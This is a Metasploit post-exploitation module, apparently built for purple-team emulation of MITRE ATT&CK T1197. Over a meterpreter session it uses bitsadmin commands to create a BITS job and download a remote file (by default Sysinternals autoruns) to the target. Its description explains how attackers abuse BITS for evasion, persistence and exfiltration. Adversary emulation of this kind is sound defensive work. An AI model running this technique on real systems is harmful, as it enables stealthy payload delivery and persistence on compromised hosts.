##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Purple
  include Msf::Post::File
  include Msf::Exploit::FileDropper


  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'BITS jobs (T1197) Windows - Purple Team',
                      'Description'   => %q{
                        Defense Evasion, Persistence:
                        Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

                        The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.

                        Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also allow Persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).

                        BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1197' ],
                      [ 'URL', 'https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/'] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new("RFILE", [ false, "File to download", 'https://live.sysinternals.com/autoruns.exe']),
      OptString.new("LFILE", [ false, "Local file path", 'C:\\t1197']),
      OptBool.new('CLEANUP', [false, 'Delete transferred files', true])
      # OptString.new("PATH", [ false, "Path to download to", 'c:\\autoruns.exe'])
    ])
  end

  def run
    begin
      raise "Module requires meterpreter session" if session.type != "meterpreter"
      job_id = rand(10..1197)
      print_status(job_id.to_s)
      print_status("Executing bitsadmin download of '#{datastore['RFILE']}' on #{session.inspect}")
      cmd = "bitsadmin /create #{job_id.to_s}"
      cmd2 = "bitsadmin /addfile #{job_id.to_s} #{datastore['RFILE']} #{datastore['LFILE']}"
      cmd3 = "bitsadmin /RESUME #{job_id.to_s}"
      status = "bitsadmin /info #{job_id.to_s}"

      # begin
      run_cmd(cmd)
      run_cmd(cmd2)
      run_cmd(cmd3)
      output = run_cmd(status)

      tries = 0
      until tries > 5 or output.include? "TRANSFERRED"
        print_status("Download not complete, sleeping 10 seconds then checking again")
        sleep(10)
        output = run_cmd(status)
        tries += 1
      end
      output = run_cmd("bitsadmin /complete #{job_id.to_s}")
      if output.include? "TRANSFERRED" or output.include? "Job completed."
        print_good("Download completed")
        print_good("Module T1197W execution successful.")
      else
        print_error("Download failed.")
        print_error("Module T1197W execution failed.")
      end

      # Cleanup
      if datastore['CLEANUP']
        print_status("Cleaning up transferred file")
        register_files_for_cleanup(datastore['LFILE'])
      end
    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1197W execution failed.")
    end
   end
end
